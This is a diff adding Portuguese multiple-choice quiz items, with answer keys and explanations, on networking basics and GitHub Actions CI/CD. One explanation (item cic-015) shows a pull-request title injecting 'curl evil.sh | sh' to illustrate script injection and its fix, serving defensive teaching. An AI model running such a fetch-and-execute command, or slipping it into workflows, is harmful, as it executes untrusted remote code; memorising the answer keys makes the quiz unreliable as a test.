@@ -5198,5 +5198,645 @@
       "label": "Estruturas de dados",
       "description": "Listas, conjuntos, dicionários, filas e complexidade"
     }
+  },
+  {
+    "id": "net-001",
+    "language": "bash",
+    "question": "O que o DNS faz?",
+    "code": "nslookup example.com",
+    "options": [
+      "Criptografa a conexão entre o navegador e o site",
+      "Traduz nomes de sites (exemplo.com) em endereços IP",
+      "Escolhe o provedor de internet mais barato da região",
+      "Aumenta a velocidade da internet guardando as páginas"
+    ],
+    "answer": 1,
+    "explanation": "O DNS é a \"lista telefônica\" da internet: os computadores se falam por endereço IP, e o DNS converte o nome que as pessoas digitam (`example.com`) no IP do servidor. Ele não criptografa nada nem escolhe provedor.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-002",
+    "language": "bash",
+    "question": "O que é o endereço 127.0.0.1 (localhost)?",
+    "code": "ping 127.0.0.1",
+    "options": [
+      "O endereço do roteador da sua casa ou escritório",
+      "Um endereço de teste que a internet pública responde",
+      "O próprio computador, sem sair para a rede",
+      "O servidor DNS do seu provedor de internet"
+    ],
+    "answer": 2,
+    "explanation": "O 127.0.0.1 é o endereço de loopback: a conexão volta para a própria máquina, sem passar pela rede. Um servidor que escuta só nele aceita conexões do próprio computador e recusa as que chegam pelo IP da rede local.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-003",
+    "language": "http",
+    "question": "Qual é a porta padrão do HTTPS?",
+    "code": "https://exemplo.com:____/",
+    "options": [
+      "22",
+      "80",
+      "443",
+      "8080"
+    ],
+    "answer": 2,
+    "explanation": "Cada serviço tem uma porta de costume: HTTP na 80, HTTPS na 443, SSH na 22. O navegador usa a 443 sozinho quando o endereço começa com `https://`. A 8080 é só uma alternativa comum para HTTP em desenvolvimento.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-004",
+    "language": "bash",
+    "question": "Numa conexão, o que a porta identifica?",
+    "code": "",
+    "options": [
+      "Qual provedor de internet está sendo usado na conexão",
+      "Qual é a velocidade máxima permitida na conexão",
+      "Qual computador da rede é o destino final do pacote",
+      "Qual programa da máquina deve receber os dados"
+    ],
+    "answer": 3,
+    "explanation": "O IP leva os dados até a máquina certa, e a porta leva até o programa certo dentro dela (um servidor web na 80, um banco de dados na 5432...). Dois programas no mesmo IP convivem porque usam portas diferentes.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-005",
+    "language": "bash",
+    "question": "Qual é a diferença principal entre TCP e UDP?",
+    "code": "",
+    "options": [
+      "O TCP só funciona na internet e o UDP só em redes locais",
+      "O UDP é criptografado por padrão e o TCP não é",
+      "O TCP garante entrega e ordem; o UDP envia sem garantias",
+      "O UDP exige uma conexão prévia e o TCP envia direto"
+    ],
+    "answer": 2,
+    "explanation": "O TCP abre uma conexão, confirma o recebimento, reenvia o que se perde e entrega os bytes em ordem. O UDP só despacha pacotes (datagramas): é mais leve e rápido, mas sem garantia. Serve a vídeo ao vivo, jogos e DNS; o TCP serve a web, e-mail e arquivos.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-006",
+    "language": "bash",
+    "question": "Quantos endereços de host utilizáveis tem a rede 192.168.0.0/24?",
+    "code": "",
+    "options": [
+      "24",
+      "254",
+      "255",
+      "256"
+    ],
+    "answer": 1,
+    "explanation": "O /24 reserva 24 bits para a rede e deixa 8 para os hosts: 2⁸ = 256 endereços. Dois não servem para máquinas: o primeiro (192.168.0.0, o endereço da rede) e o último (192.168.0.255, o broadcast). Sobram 254.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-007",
+    "language": "http",
+    "question": "Qual é uma requisição HTTP/1.1 mínima e válida?",
+    "code": "",
+    "options": [
+      "POST / HTTP/1.1, que é o único método sem cabeçalhos",
+      "GET http://exemplo.com, com ponto e vírgula no final",
+      "GET / HTTP/1.1 e nada além da primeira linha, sem Host",
+      "GET / HTTP/1.1 + Host: exemplo.com + linha em branco"
+    ],
+    "answer": 3,
+    "explanation": "No HTTP/1.1, o cabeçalho `Host` é obrigatório (vários sites dividem o mesmo IP e o servidor precisa saber qual é o pedido), e a linha em branco marca o fim dos cabeçalhos. Sem o `Host`, o servidor responde `400 Bad Request`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-008",
+    "language": "bash",
+    "question": "Uma conexão tem alta largura de banda, mas latência de 300 ms. Qual é o efeito?",
+    "code": "",
+    "options": [
+      "Os downloads grandes também ficam lentos, em qualquer caso",
+      "Downloads grandes são rápidos, mas cada ida e volta demora",
+      "A conexão cai sempre que passa de 300 ms de uso",
+      "Só os vídeos são afetados; páginas e arquivos não"
+    ],
+    "answer": 1,
+    "explanation": "Largura de banda é quanto cabe por segundo (o diâmetro do cano); latência é quanto demora uma ida e volta (o comprimento). Com muita banda e muita latência, um arquivo grande baixa depressa, mas cada clique, requisição ou handshake espera 300 ms.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-009",
+    "language": "bash",
+    "question": "Ao abrir https://exemplo.com, o que o navegador confere no certificado?",
+    "code": "",
+    "options": [
+      "Se o endereço IP do site está na lista de provedores aprovados",
+      "Se o site usa a porta 443 e responde em menos de 100 ms",
+      "Domínio certo, autoridade confiável e dentro da validade",
+      "Se o dono do site pagou o certificado há menos de um ano"
+    ],
+    "answer": 2,
+    "explanation": "O certificado liga uma chave pública a um domínio. O navegador confere se ele vale para aquele nome, se foi emitido por uma autoridade (CA) em que confia e se não venceu. Falhando qualquer um, aparece o aviso de conexão não segura.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-010",
+    "language": "bash",
+    "question": "Qual destes é um endereço IP privado, que não é roteado na internet?",
+    "code": "",
+    "options": [
+      "200.100.50.25",
+      "8.8.8.8",
+      "192.168.1.10",
+      "172.32.0.1"
+    ],
+    "answer": 2,
+    "explanation": "As faixas privadas (RFC 1918) são 10.0.0.0/8, 172.16.0.0/12 (de 172.16 a 172.31) e 192.168.0.0/16. O 172.32.0.1 fica logo fora da faixa e é público. Redes domésticas usam IPs privados e o roteador faz NAT para sair com um IP público.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-011",
+    "language": "bash",
+    "question": "O que significa o TTL de um registro DNS?",
+    "code": "example.com.   300   IN   A   93.184.216.34",
+    "options": [
+      "Quantas vezes por dia o domínio pode ser acessado",
+      "Quantos servidores respondem pelo nome do site",
+      "A velocidade máxima de download permitida pelo site",
+      "Por quanto tempo a resposta pode ficar em cache"
+    ],
+    "answer": 3,
+    "explanation": "O TTL (time to live), em segundos, diz a navegadores e resolvedores por quanto tempo podem reaproveitar a resposta sem perguntar de novo. TTL baixo troca de servidor mais rápido, mas gera mais consultas; TTL alto economiza consultas, mas a mudança demora a valer.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-012",
+    "language": "bash",
+    "question": "O servidor escuta em 127.0.0.1, mas http://localhost às vezes falha. Por quê?",
+    "code": "",
+    "options": [
+      "O localhost só funciona quando a porta 80 está liberada",
+      "localhost pode virar ::1 (IPv6), onde ninguém escuta",
+      "O servidor precisa de um certificado para atender localhost",
+      "O navegador bloqueia o acesso a localhost por segurança"
+    ],
+    "answer": 1,
+    "explanation": "O nome `localhost` pode apontar para 127.0.0.1 (IPv4) e para ::1 (IPv6). Se o cliente tentar o ::1 primeiro e o servidor só escutar no IPv4, a conexão é recusada. A saída é escutar nos dois, ou chamar 127.0.0.1 de forma explícita.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-013",
+    "language": "bash",
+    "question": "Quais pacotes abrem uma conexão TCP, em ordem?",
+    "code": "",
+    "options": [
+      "SYN, ACK, FIN",
+      "SYN, SYN-ACK, ACK",
+      "HELLO, ACK, READY",
+      "ACK, SYN, SYN-ACK"
+    ],
+    "answer": 1,
+    "explanation": "O handshake de três vias: o cliente envia SYN (\"quero conectar\"), o servidor responde SYN-ACK (\"ok, e eu também\") e o cliente confirma com ACK. Só então os dados fluem. O FIN, ao contrário, serve para encerrar.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-014",
+    "language": "bash",
+    "question": "O que acontece ao enviar dados a uma porta onde ninguém escuta, no TCP e no UDP?",
+    "code": "",
+    "options": [
+      "Os dois recusam na hora, com o mesmo erro de conexão recusada",
+      "Os dois fingem que deu certo e perdem os dados em silêncio",
+      "TCP: fica esperando para sempre; UDP: recusa na hora com erro",
+      "TCP: recusa na hora (RST); UDP: envia e ninguém responde"
+    ],
+    "answer": 3,
+    "explanation": "O TCP exige conexão: a porta fechada responde com RST e o cliente recebe \"conexão recusada\" imediatamente. O UDP não tem conexão, então o envio \"funciona\" e a mensagem se perde (no máximo chega um aviso ICMP, que muitos programas nem veem).",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-015",
+    "language": "http",
+    "question": "Para que serve o cabeçalho Connection: keep-alive?",
+    "code": "GET /api/produtos HTTP/1.1\nHost: exemplo.com\nConnection: keep-alive",
+    "options": [
+      "Reaproveitar a conexão TCP em várias requisições",
+      "Manter o site no ar mesmo se o servidor reiniciar",
+      "Repetir a requisição automaticamente se ela falhar",
+      "Deixar o navegador logado depois de fechar a aba"
+    ],
+    "answer": 0,
+    "explanation": "Abrir uma conexão TCP (e TLS, no HTTPS) custa idas e voltas. Com `keep-alive`, a mesma conexão atende várias requisições em sequência, poupando esse custo. No HTTP/1.1 é o comportamento padrão; `Connection: close` é que pede para fechar.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-016",
+    "language": "bash",
+    "question": "O computador 192.168.1.10/24 consegue falar direto com 192.168.2.20/24, sem roteador?",
+    "code": "",
+    "options": [
+      "Não: são redes diferentes (192.168.1.0/24 e 192.168.2.0/24)",
+      "Não, porque os dois IPs terminam em números diferentes entre si",
+      "Sim: os dois começam com 192.168, então são da mesma rede",
+      "Sim, desde que usem a mesma porta nos dois lados da conexão"
+    ],
+    "answer": 0,
+    "explanation": "A máscara /24 diz que só os 3 primeiros números identificam a rede. Os dois ficam em redes diferentes, então o tráfego precisa passar por um roteador (gateway). Com /16, a rede seria 192.168.0.0 e os dois se falariam direto.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "cic-001",
+    "language": "yaml",
+    "question": "O que é integração contínua (CI)?",
+    "code": "",
+    "options": [
+      "Revisar cada commit com uma pessoa do time antes de aceitar o envio",
+      "Juntar todo o código do time numa única branch por semana",
+      "Rodar build e testes sozinhos a cada mudança enviada ao repositório",
+      "Publicar o site em produção manualmente, uma vez por mês"
+    ],
+    "answer": 2,
+    "explanation": "Na CI, cada mudança enviada ao repositório dispara automaticamente a compilação e os testes. Assim os problemas de integração aparecem em minutos, quando ainda são pequenos, e não semanas depois, quando várias mudanças se misturaram.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-002",
+    "language": "yaml",
+    "question": "Em qual pasta do repositório ficam os workflows do GitHub Actions?",
+    "code": "",
+    "options": [
+      "ci/workflows",
+      ".github/workflows",
+      ".workflows/github",
+      ".github/actions"
+    ],
+    "answer": 1,
+    "explanation": "O GitHub procura os arquivos `.yml` ou `.yaml` de workflow na pasta `.github/workflows`. Cada arquivo é um workflow, e um repositório pode ter vários (um para testes, outro para deploy...).",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-003",
+    "language": "yaml",
+    "question": "Quando esse workflow roda?",
+    "code": "on:\n  pull_request:",
+    "options": [
+      "Quando alguém comenta ou reage em qualquer pull request do repositório",
+      "Só quando o pull request é aprovado e está pronto para o merge",
+      "Quando um pull request é aberto, recebe novos commits ou é reaberto",
+      "Toda noite, às 00:00 UTC, em todas as branches do repositório"
+    ],
+    "answer": 2,
+    "explanation": "Sem a opção `types`, o evento `pull_request` usa os tipos padrão: `opened` (aberto), `synchronize` (novos commits) e `reopened` (reaberto). Para outros momentos, como `closed` ou `labeled`, é preciso listá-los em `types`.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-004",
+    "language": "yaml",
+    "question": "Qual a diferença entre CI e CD (entrega contínua)?",
+    "code": "",
+    "options": [
+      "São o mesmo processo, só mudam o nome conforme a empresa",
+      "CI integra e testa cada mudança; CD entrega a versão aprovada",
+      "CI roda só em produção; CD roda só na máquina de quem programa",
+      "CI cuida do banco de dados; CD cuida da interface do usuário"
+    ],
+    "answer": 1,
+    "explanation": "A CI (integração contínua) garante que cada mudança compila e passa nos testes. A CD (entrega ou implantação contínua) leva a versão aprovada adiante, até um ambiente de testes ou direto à produção, de forma automática e repetível.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-005",
+    "language": "yaml",
+    "question": "Em que ordem os jobs rodam?",
+    "code": "jobs:\n  testar:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  publicar:\n    needs: testar\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run deploy\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint",
+    "options": [
+      "Um de cada vez, na ordem em que aparecem no arquivo",
+      "publicar roda primeiro, já que declarou a dependência no arquivo",
+      "testar e lint em paralelo; publicar só depois do testar",
+      "Todos em paralelo, pois o needs só serve para documentar"
+    ],
+    "answer": 2,
+    "explanation": "Os jobs rodam em paralelo por padrão. O `needs` cria dependência: `publicar` só começa quando `testar` termina com sucesso (e é pulado se ele falhar). O `lint` não depende de ninguém e roda junto com o `testar`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-006",
+    "language": "yaml",
+    "question": "Um job gera um arquivo, mas o job seguinte não o encontra. Por quê?",
+    "code": "",
+    "options": [
+      "Os jobs só enxergam os arquivos que estão na pasta .github/workflows",
+      "O GitHub apaga os arquivos sempre que um job termina com erro",
+      "O segundo job precisa de um runs-on diferente do primeiro",
+      "Cada job roda no próprio runner; é preciso passar por artifacts"
+    ],
+    "answer": 3,
+    "explanation": "Cada job roda numa máquina virtual (ou contêiner) limpa e própria. Os steps do MESMO job compartilham o disco, mas jobs diferentes não. Para passar arquivos de um job a outro, envie-os como artifact (`upload-artifact`) e baixe no outro (`download-artifact`).",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-007",
+    "language": "yaml",
+    "question": "Quantas execuções do job esse trecho cria?",
+    "code": "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [20, 22]",
+    "options": [
+      "2, uma para cada sistema operacional da lista",
+      "2, uma para cada versão do Node da lista",
+      "6, que é a soma dos itens das duas listas",
+      "4, uma para cada combinação de os e node"
+    ],
+    "answer": 3,
+    "explanation": "A matriz gera uma execução para cada combinação das variáveis: 2 sistemas × 2 versões = 4 jobs (ubuntu+20, ubuntu+22, windows+20, windows+22). É a forma de testar o código em vários ambientes sem repetir o job.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-008",
+    "language": "yaml",
+    "question": "Onde fica guardado o valor de DEPLOY_TOKEN?",
+    "code": "- run: ./deploy.sh\n  env:\n    TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+    "options": [
+      "Nos Secrets do repositório, fora do código do projeto",
+      "No navegador de quem abriu o pull request, durante a execução",
+      "Na branch main, dentro de um arquivo .env criptografado",
+      "No próprio arquivo do workflow, escrito em texto puro"
+    ],
+    "answer": 0,
+    "explanation": "Segredos ficam em Settings → Secrets and variables, cifrados pelo GitHub, e entram no workflow pela expressão `${{ secrets.NOME }}`. O valor nunca aparece no código, e o GitHub o mascara nos logs.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-009",
+    "language": "yaml",
+    "question": "Para que serve o hashFiles na chave do cache?",
+    "code": "- uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: npm-${{ hashFiles('**/package-lock.json') }}",
+    "options": [
+      "Criptografa o cache para que ninguém consiga ler as dependências",
+      "A chave muda quando o lockfile muda, e um cache novo é criado",
+      "Faz o cache expirar sozinho todos os dias à meia-noite",
+      "Compara os arquivos do cache com os do repositório linha a linha"
+    ],
+    "answer": 1,
+    "explanation": "Enquanto o `package-lock.json` não mudar, o hash (e a chave) é o mesmo e o cache anterior é reaproveitado, poupando o `npm install`. Se as dependências mudam, a chave muda e um cache novo é criado automaticamente.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-010",
+    "language": "yaml",
+    "question": "O que isso faz quando você envia um commit novo na mesma branch?",
+    "code": "concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true",
+    "options": [
+      "Ignora o commit novo até a execução antiga terminar sozinha",
+      "Cancela a execução antiga em andamento e roda só a nova",
+      "Coloca a nova execução numa fila, atrás da que está rodando",
+      "Roda as duas execuções ao mesmo tempo, em máquinas separadas"
+    ],
+    "answer": 1,
+    "explanation": "Execuções do mesmo `group` não rodam juntas. Com `cancel-in-progress: true`, a execução antiga é cancelada quando chega uma nova do mesmo grupo: poupa minutos de CI e evita testar código que já foi substituído.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-011",
+    "language": "yaml",
+    "question": "Por que declarar permissions: contents: read no workflow?",
+    "code": "permissions:\n  contents: read",
+    "options": [
+      "Faz o workflow rodar sem nenhum token, como usuário anônimo",
+      "Deixa o workflow mais rápido ao pular a etapa de checkout",
+      "Limita o GITHUB_TOKEN ao necessário (menor privilégio)",
+      "Impede que o workflow leia qualquer arquivo do repositório"
+    ],
+    "answer": 2,
+    "explanation": "O `GITHUB_TOKEN` é criado a cada execução, e o bloco `permissions` define o que ele pode fazer. Começar só com leitura segue o princípio do menor privilégio: se um passo for comprometido, o estrago é limitado. Dê mais permissões só aos jobs que precisam.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-012",
+    "language": "yaml",
+    "question": "Como exigir a aprovação de uma pessoa antes de um deploy em produção?",
+    "code": "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: producao\n    steps:\n      - run: ./deploy.sh",
+    "options": [
+      "Usar um environment com revisores obrigatórios",
+      "Colocar needs: aprovacao no job, apontando para um job vazio",
+      "Trocar o runs-on por um runner que só roda de madrugada",
+      "Escrever if: aprovado no job e marcar a variável à mão"
+    ],
+    "answer": 0,
+    "explanation": "Um `environment` do GitHub pode ter regras de proteção, como revisores obrigatórios: o job que o referencia pausa até uma das pessoas aprovar. O ambiente também guarda segredos próprios e pode limitar quais branches fazem deploy nele.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-013",
+    "language": "yaml",
+    "question": "Um pull request vindo de um fork passa a rodar o seu workflow. O que acontece com os secrets?",
+    "code": "on:\n  pull_request:\njobs:\n  testar:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./testar.sh\n        env:\n          TOKEN: ${{ secrets.MEU_TOKEN }}",
+    "options": [
+      "Não são entregues (só o GITHUB_TOKEN, somente leitura)",
+      "O workflow nem chega a rodar, pois forks são bloqueados",
+      "São entregues, mas mascarados em todas as linhas de log",
+      "São entregues normalmente, como em qualquer outra branch"
+    ],
+    "answer": 0,
+    "explanation": "Para proteger os segredos de quem abre um PR malicioso, os workflows de `pull_request` vindos de forks não recebem secrets (só o `GITHUB_TOKEN`, que fica somente leitura). Por isso o `${{ secrets.MEU_TOKEN }}` chega vazio.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-014",
+    "language": "yaml",
+    "question": "Por que fixar uma action pelo SHA completo do commit, e não por tag?",
+    "code": "# em vez de\n- uses: acme/deploy@v2\n# use\n- uses: acme/deploy@3f9e1c8a7b6d4e2f1a0b9c8d7e6f5a4b3c2d1e0f",
+    "options": [
+      "Uma tag pode ser movida para outro código; o SHA não",
+      "O SHA dispensa o GitHub de baixar a action a cada execução",
+      "A tag impede o uso da action em repositórios privados",
+      "O SHA faz a action rodar mais rápido que a tag"
+    ],
+    "answer": 0,
+    "explanation": "Tags e branches podem ser reapontadas: quem controla (ou invade) o repositório da action pode trocar o código de `v2` por um malicioso, e o seu workflow passaria a rodá-lo. O SHA completo é imutável, e forjar outro commit com o mesmo hash é inviável.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-015",
+    "language": "yaml",
+    "question": "Qual é o risco desse passo, e qual a correção recomendada?",
+    "code": "- run: echo \"${{ github.event.pull_request.title }}\"",
+    "options": [
+      "Vazamento do título em logs públicos; ative a máscara de texto",
+      "Nenhum: o GitHub escapa todo texto que vem de fontes externas",
+      "Estouro do limite de caracteres; corte o título em 100 letras",
+      "Injeção de script; passe o valor por uma variável de ambiente"
+    ],
+    "answer": 3,
+    "explanation": "A expressão `${{ }}` é substituída ANTES de o shell rodar, então um título como `\"; curl evil.sh | sh; \"` vira parte do comando. A correção é pôr o valor numa variável de ambiente (`env: TITULO: ${{ ... }}`) e usar `\"$TITULO\"` no script, onde ele é só dado.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-016",
+    "language": "yaml",
+    "question": "No deploy canário (canary), o que acontece?",
+    "code": "",
+    "options": [
+      "A versão antiga é apagada antes de a nova ser testada por alguém",
+      "A nova versão roda só no computador de quem a programou",
+      "O deploy só acontece de madrugada, quando há menos acessos",
+      "A nova versão atende só uma pequena parte dos usuários"
+    ],
+    "answer": 3,
+    "explanation": "No canário, a versão nova recebe de início só uma fatia pequena do tráfego (1% a 5%). Se as métricas e os erros estiverem bem, a fatia cresce até 100%; se não, volta-se atrás com poucos usuários afetados. O blue/green, em comparação, troca todo o tráfego de uma vez entre dois ambientes completos.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
   }
 ]
